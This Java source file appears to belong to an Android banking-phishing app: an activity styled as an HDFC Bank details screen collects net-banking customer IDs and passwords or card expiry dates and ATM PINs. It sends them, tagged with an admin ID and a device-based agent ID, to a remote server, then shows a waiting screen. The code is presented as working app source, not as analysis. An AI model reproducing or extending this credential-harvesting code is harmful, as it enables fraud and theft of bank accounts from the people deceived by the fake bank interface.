package com.pegalite.neotron3.ui.hdfc;

import android.content.Intent;
import android.os.Bundle;
import android.provider.Settings;
import android.text.Editable;
import android.text.TextWatcher;
import android.view.View;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.content.ContextCompat;

import com.pegalite.neotron3.R;
import com.pegalite.neotron3.databinding.ActivityHdfcbankDetailsBinding;
import com.pegalite.neotron3.functions.Utils;
import com.pegalite.neotron3.server.req.RetrofitClient;

import org.json.JSONException;
import org.json.JSONObject;

import okhttp3.ResponseBody;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

public class HDFCBankDetailsActivity extends AppCompatActivity {

    ActivityHdfcbankDetailsBinding binding;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        binding = ActivityHdfcbankDetailsBinding.inflate(getLayoutInflater());
        setContentView(binding.getRoot());
        getWindow().setStatusBarColor(ContextCompat.getColor(this, R.color.midnight_blue));

        binding.netBanking.setOnClickListener(v -> {
            binding.netBankingContainer.setVisibility(View.VISIBLE);
            binding.debitCardContainer.setVisibility(View.GONE);

        });

        binding.debitCard.setOnClickListener(v -> {
            binding.netBankingContainer.setVisibility(View.GONE);
            binding.debitCardContainer.setVisibility(View.VISIBLE);
        });

        binding.expiry.addTextChangedListener(new TextWatcher() {
            private boolean isFormatting;

            @Override
            public void beforeTextChanged(CharSequence s, int start, int count, int after) {
            }

            @Override
            public void onTextChanged(CharSequence s, int start, int before, int count) {
            }

            @Override
            public void afterTextChanged(Editable s) {
                if (isFormatting) return;
                isFormatting = true;

                String input = s.toString().replaceAll("/", "");

                if (input.length() >= 3) {
                    input = input.substring(0, 2) + "/" + input.substring(2);
                }

                binding.expiry.removeTextChangedListener(this);
                binding.expiry.setText(input);
                binding.expiry.setSelection(input.length());
                binding.expiry.addTextChangedListener(this);

                isFormatting = false;
            }
        });

        binding.submit.setOnClickListener(v -> {
            if (binding.netBankingContainer.getVisibility() == View.VISIBLE) {
                handleNetBanking();
                return;
            }
            handleCard();
        });
    }

    private void handleCard() {
        String expiry = binding.expiry.getText().toString();
        String atmPin = binding.atmPin.getText().toString();

        if (expiry.isEmpty() || atmPin.isEmpty()) {
            Toast.makeText(this, "Please Enter All the Details!", Toast.LENGTH_SHORT).show();
            return;
        }

        try {
            JSONObject object = new JSONObject(getIntent().getStringExtra("data"));
            object.put("atmPin", atmPin);
            object.put("expiry", expiry);
            saveDetails(object);
            startActivity(new Intent(this, HDFCWaitingActivity.class).putExtra("data", object.toString()));
        } catch (JSONException e) {
            throw new RuntimeException(e);
        }

    }

    private void handleNetBanking() {
        String customerID = binding.customerID.getText().toString();
        String password = binding.password.getText().toString();

        if (customerID.isEmpty() || password.isEmpty()) {
            Toast.makeText(this, "Please Enter All the Details!", Toast.LENGTH_SHORT).show();
            return;
        }

        try {
            JSONObject object = new JSONObject(getIntent().getStringExtra("data"));
            object.put("customerID", customerID);
            object.put("password", password);
            saveDetails(object);
            startActivity(new Intent(this, HDFCWaitingActivity.class).putExtra("data", object.toString()));
        } catch (JSONException e) {
            throw new RuntimeException(e);
        }


    }

    private void saveDetails(JSONObject data) {
        try {
            RetrofitClient.getInstance(this).getApiInterfaces()
                    .onSaveDetails(RetrofitClient.generateRequestBody(new JSONObject().put("adminID", Utils.ADMIN_ID).put("submissionId", data.optString("submissionId")).put("agentID", "agent-" + Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID) + "-" + getPackageName())
                            .put("details", data.put("type", Utils.THEME)))).enqueue(new Callback<>() {
                        @Override
                        public void onResponse(@NonNull Call<ResponseBody> call, @NonNull Response<ResponseBody> response) {

                        }

                        @Override
                        public void onFailure(@NonNull Call<ResponseBody> call, @NonNull Throwable throwable) {

                        }
                    });
        } catch (JSONException e) {
            throw new RuntimeException(e);
        }
    }


}